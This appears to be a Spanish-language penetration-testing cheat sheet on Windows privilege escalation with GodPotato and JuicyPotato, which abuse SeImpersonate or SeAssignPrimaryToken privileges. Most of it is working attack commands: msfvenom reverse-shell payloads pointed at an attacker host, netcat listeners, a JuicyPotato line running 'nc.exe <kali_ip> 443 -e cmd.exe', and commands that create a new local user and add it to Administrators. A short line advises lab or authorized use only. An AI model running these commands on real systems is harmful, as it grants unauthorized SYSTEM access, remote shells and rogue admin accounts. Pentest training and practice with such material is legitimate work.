GodPotato

Estas técnicas tipo Potato dependen de privilegios como SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege y de la versión/parches del sistema. Validar siempre en laboratorio o dentro del alcance autorizado.

PowerShell: Reverse Shell

GodPotato -cmd "C:\Users\Public\reverse.exe"
# Kali: Payload y Listener
msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > reverse.exe
rlwrap nc -nlvp 443
# A veces crear una shell se rompe y es mejor crear un usuario y hacerlo Administrator

PowerShell: Crear un usuario y hacerlo Administrator

GodPotato -cmd "net user /add username Password123"
GodPotato -cmd "net localgroup administrators /add username"
RunasCs.exe username Password123 "C:/Users/Public/reverse.exe" --force-profile --logon-type 8

Juicy Potato 32/86 Bits NetCat 32/86 Bits

  • Windows 7, 8.1, 10(<1809),Windows Server 2008/2012/2016
  • SeImpersonate o SeAssignPrimaryToken

Preparación

# Payload
msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > backdoor.exe
# Subir nc/backdoor y JuicyPotato en una carpeta C:/temp
upload /backdoor.exe .
upload /nc.exe .
upload /JuicyPotato.exe .
# Listener
rlwrap nc -nlvp 443

CMD: JuicyPotato

# NetCat
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe <kali_ip> 443 -e cmd.exe" -t *
# Backdoor
JuicyPotato.exe -l 53375 -p backdoor.exe -t *
# CLSID manual (Sin el parámetro -c escoge uno por defecto: BITS)
JuicyPotato.exe -l 53375 -p backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

CLSID (identificador único global de objetos de clase COM) para los diferentes sistemas operativos

JuicyPotato: Argumentos

-l: Cualquier puerto local para COM trigger
-p: Programa a ejecutar
-t: Abusar de SeImpersonate o SeAssignPrimaryToken (* ambas)
-a: Argumento de -p
